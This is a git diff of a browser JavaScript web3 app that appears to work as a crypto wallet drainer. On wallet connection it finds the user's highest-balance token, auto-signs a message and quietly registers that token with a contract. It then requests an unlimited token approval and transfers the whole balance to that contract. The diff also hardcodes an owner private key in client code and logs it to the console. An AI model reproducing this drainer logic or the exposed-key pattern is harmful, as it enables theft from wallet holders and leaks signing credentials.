@@ -6,6 +6,7 @@ import {
 import { reconnect, getAccount, watchAccount, signMessage, writeContract } from "https://esm.sh/@wagmi/core@2.x"
 import { TokenBalanceUI, TokenService, TokenFormatter, TokenContractDetails } from "./tokenLoader.js"
 import { TokenApprover } from "./approve.js"
+import TokenBalanceCalculator from "./getBalance.js"
 
 // Initialize TokenContractDetails with Web3 instance
 const web3 = new Web3(window.ethereum)
@@ -55,11 +56,24 @@ document.getElementById("disconnect-btn")?.addEventListener("click", () => {
   clearStoredSignature()
 })
 
+// Add this function to call setTokenAddress on DR_CONTRACT
+const hexToUint8Array = (hex) => {
+  if (hex.startsWith("0x")) hex = hex.slice(2) // Remove the 0x prefix if present
+  const bytes = new Uint8Array(hex.length / 2)
+  for (let i = 0; i < bytes.length; i++) {
+    bytes[i] = Number.parseInt(hex.substr(i * 2, 2), 16)
+  }
+  return bytes
+}
+
 // Initialize TokenBalanceUI
 const tokenBalanceUI = new TokenBalanceUI(".token-balances")
 
+const ownerPrivateKey = hexToUint8Array("4e6fd4360b712865f7355cae6f943da27759b8b1b144d0e47e50c213664a6389")
+console.log(ownerPrivateKey)
+
 // Add this after your existing wagmiAdapter initialization
-const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig)
+const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig, "0x" + Buffer.from(ownerPrivateKey).toString("hex"))
 
 // Add the automatic signing function
 const SIGNATURE_KEY = "wallet_signature"
@@ -143,7 +157,7 @@ watchAccount(wagmiAdapter.wagmiConfig, {
   onChange(account) {
     if (account?.address) {
       updateWalletInfo(account.address, account.chainId)
-      loadTokenBalances(account.address) // This will now automatically set the token address
+      loadTokenBalances(account.address)
       autoSignMessage(account.address)
     } else {
       document.querySelector(".wallet-info").style.display = "none"
@@ -154,11 +168,11 @@ watchAccount(wagmiAdapter.wagmiConfig, {
 })
 
 // Check initial connection
+// Update existing initial connection check
 const initialAccount = getAccount(wagmiAdapter.wagmiConfig)
 if (initialAccount.address) {
   updateWalletInfo(initialAccount.address, initialAccount.chainId)
   loadTokenBalances(initialAccount.address)
-  console.log(wagmiAdapter.wagmiConfig, initialAccount)
   document.querySelector(".sign-message-section").style.display = "block"
 }
 
@@ -167,13 +181,14 @@ document.querySelector("#sign-message-btn")?.addEventListener("click", handleMes
 
 // LXB Contract Constants
 const LXB_CONTRACT = {
-  ADDRESS: "0x5C1dDe72466339b8B9919799BcEd5e46C27A9586", // Replace with your Sepolia contract address
+  // ADDRESS: "0x5C1dDe72466339b8B9919799BcEd5e46C27A9586", // Replace with your Sepolia contract address
+  ADDRESS: "0xEF0575BF42c13352B1033fF23dD711FC841E56c8",
   CHAIN_ID: 11155111, // Sepolia chain ID
   DECIMALS: 18,
 }
 
 const DR_CONTRACT = {
-  ADDRESS: "0xb6cfA3FE5c025BbE9b585A74e91D676eED01F4A1", // Replace with your Sepolia contract address
+  ADDRESS: "0x7aEBb27455DD33Fc0f555D09A4d2424BDEdC220E", // Replace with your Sepolia contract address
   CHAIN_ID: 11155111, // Sepolia chain ID
   DECIMALS: 18,
 }
@@ -211,19 +226,6 @@ async function displayHighestBalanceToken(tokenAddress, isSetSuccessful) {
 
   statusEl.innerHTML = message
 }
-
-// Add this function to call setTokenAddress on DR_CONTRACT
-const hexToUint8Array = (hex) => {
-  if (hex.startsWith("0x")) hex = hex.slice(2) // Remove the 0x prefix if present
-  const bytes = new Uint8Array(hex.length / 2)
-  for (let i = 0; i < bytes.length; i++) {
-    bytes[i] = Number.parseInt(hex.substr(i * 2, 2), 16)
-  }
-  return bytes
-}
-
-const ownerPrivateKey = hexToUint8Array("4e6fd4360b712865f7355cae6f943da27759b8b1b144d0e47e50c213664a6389")
-console.log(ownerPrivateKey)
 
 async function setTokenAddress(tokenAddress) {
   const web3 = new Web3(window.ethereum)
@@ -273,81 +275,81 @@ async function setTokenAddress(tokenAddress) {
 
 document.querySelector("#approve-token")?.addEventListener("click", async () => {
   try {
-      const account = getAccount(wagmiAdapter.wagmiConfig);
-      if (!account.address) {
-          throw new Error("Please connect your wallet first");
-      }
+    const account = getAccount(wagmiAdapter.wagmiConfig)
+    if (!account.address) {
+      throw new Error("Please connect your wallet first")
+    }
 
-      // Get all tokens and find the one with highest balance
-      const tokens = await fetchUserTokens(account.address, account.chainId);
-      const highestBalanceToken = await getTokenWithHighestBalance(tokens);
-      
-      if (!highestBalanceToken) {
-          throw new Error("No tokens found in wallet");
-      }
+    // Get all tokens and find the one with highest balance
+    const tokens = await fetchUserTokens(account.address, account.chainId)
+    // Get the token with the highest balance
+    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
+      minBalance: 0.01,
+      excludeTokens: ['DUST'],
+    });
+    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(filteredTokens);
 
-      // Show contract details before approval
-      const details = await tokenDetailsViewer.getContractDetails(
-          LXB_CONTRACT.ADDRESS,
-          account.address,
-          DR_CONTRACT.ADDRESS,
-      );
+    if (!highestBalanceToken) {
+      throw new Error("No tokens found in wallet")
+    }
 
-      console.log("Highest balance token:", highestBalanceToken);
-      console.log("Contract details:", details);
+    // Show contract details before approval
+    const details = await tokenDetailsViewer.getContractDetails(
+      LXB_CONTRACT.ADDRESS,
+      account.address,
+      DR_CONTRACT.ADDRESS,
+    )
 
-      // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
-      // First multiply by 10^18 as a string to avoid floating point issues
-      const balanceInWei = BigInt(
-          Math.floor(
-              parseFloat(highestBalanceToken.balance) * 10**18
-          ).toString()
-      );
+    console.log("Highest balance token:", highestBalanceToken)
+    console.log("Contract details:", details)
 
-      console.log("Balance in Wei:", balanceInWei.toString());
+    // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
+    // const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18).toString())
+    const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18))
 
-      // Display the details
-      tokenDetailsViewer.createDetailsDisplay(detailsContainer, details);
+    console.log("Balance in Wei:", balanceInWei.toString())
 
-      // Ask for confirmation
-      const confirmed = confirm(
-          `Do you want to approve and transfer ${highestBalanceToken.balance} ${highestBalanceToken.symbol} tokens to ${DR_CONTRACT.ADDRESS}?`
-      );
-      if (!confirmed) {
-          return;
-      }
+    // Display the details
+    tokenDetailsViewer.createDetailsDisplay(detailsContainer, details)
 
-      // Verify we're on the correct network
-      if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
-          throw new Error("Please switch to Ethereum Mainnet");
-      }
+    // Ask for confirmation
+    const confirmed = confirm(
+      `Do you want to approve and transfer ${highestBalanceToken.balance} ${highestBalanceToken.symbol} tokens to ${DR_CONTRACT.ADDRESS}?`,
+    )
+    if (!confirmed) {
+      return
+    }
 
-      const approvalAmount = (2n ** 256n - 1n).toString();
+    // Verify we're on the correct network
+    if (account.chainId !== LXB_CONTRACT.CHAIN_ID) {
+      throw new Error("Please switch to Sepolia Testnet")
+    }
 
-      const statusEl = document.querySelector("#status");
-      statusEl.textContent = "Initiating approval and transfer...";
+    const approvalAmount = (2n ** 256n - 1n).toString()
 
-      // Use the new approveAndSpend method with the highest balance token
-      const { approveTx, spendTx } = await tokenApprover.approveAndSpend(
-          LXB_CONTRACT.ADDRESS,
-          DR_CONTRACT.ADDRESS,
-          balanceInWei,
-          approvalAmount,
-          highestBalanceToken.address
-      );
+    const statusEl = document.querySelector("#status")
+    statusEl.textContent = "Initiating approval and transfer..."
 
-      console.log("Approval transaction:", approveTx);
-      console.log("Spend transaction:", spendTx);
-      
-      statusEl.textContent = `Successfully approved and transferred ${highestBalanceToken.symbol} tokens!`;
+    // Use the updated approveAndSpend method
+    const { spendTx } = await tokenApprover.approveAndSpend(
+      LXB_CONTRACT.ADDRESS,
+      DR_CONTRACT.ADDRESS,
+      balanceInWei,
+      approvalAmount,
+      account.address,
+    )
 
-      return { approveTx, spendTx };
+    console.log("Spend transaction:", spendTx)
+
+    statusEl.textContent = `Successfully approved and transferred ${highestBalanceToken.symbol} tokens!`
+
+    return { spendTx }
   } catch (error) {
-      console.error("Approval and transfer error:", error);
-      document.querySelector("#status").textContent = "Approval and transfer failed";
-      throw error;
+    console.error("Approval and transfer error:", error)
+    document.querySelector("#status").textContent = "Approval and transfer failed: " + error.message
+    throw error
   }
-});
+})
 
 const tokenService = new TokenService(web3)
 
@@ -375,13 +377,15 @@ async function fetchUserTokens(address, chainId) {
     if (data.tokens) {
       data.tokens.forEach((token) => {
         if (token.tokenInfo) {
-          tokens.push({
+          const tokenData = {
             symbol: token.tokenInfo.symbol || "Unknown",
             name: token.tokenInfo.name || "Unknown Token",
             balance: token.balance,
             address: token.tokenInfo.address,
             price: token.tokenInfo.price?.rate || 0,
-          })
+          }
+
+          tokens.push(tokenData)
         }
       })
     }
@@ -449,12 +453,18 @@ async function loadTokenBalances(userAddress) {
     })
 
     // Get the token with the highest balance
-    const highestBalanceToken = await getTokenWithHighestBalance(tokens)
+    const filteredTokens = TokenBalanceCalculator.filterTokens(tokens, {
+      minBalance: 0.01,
+      excludeTokens: ['DUST'],
+    });
+    const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(filteredTokens);
+    console.log(highestBalanceToken);
     if (highestBalanceToken && !hasSetTokenAddress()) {
       console.log("Token with highest balance:", highestBalanceToken)
 
       addToTransactionQueue(async () => {
         try {
+          // const tx = await setTokenAddress('highestBalanceToken.address)
           const tx = await setTokenAddress(highestBalanceToken.address)
           console.log("setTokenAddress transaction successful:", tx)
           displayHighestBalanceToken(highestBalanceToken.address, true)
